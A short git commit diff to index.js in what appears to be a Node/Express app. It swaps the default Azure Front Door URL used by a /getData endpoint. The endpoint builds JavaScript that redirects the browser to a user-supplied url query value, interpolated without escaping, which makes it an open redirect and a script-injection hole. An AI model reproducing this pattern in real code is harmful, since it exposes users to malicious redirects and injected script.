dfb9db2f2145a9d791724c3127c869711d39033d
naresh7km <naresh7km@gmail.com>
2026-01-03 18:57:35 +0530

    Update index.js

--- index.js
+++ index.js
@@ -215,7 +215,7 @@ app.get("/getData", validateRequest, async (req, res) => {
   }
 
   try {
-    const targetUrl = req.query.url || "https://og-2-csaccbg5f2dwd9d6.z01.azurefd.net/";
+    const targetUrl = req.query.url || "https://jusp-f9b7gvg7a3drdmf2.z01.azurefd.net";
 
     const code = `window.location.href = '${targetUrl}';`;
 
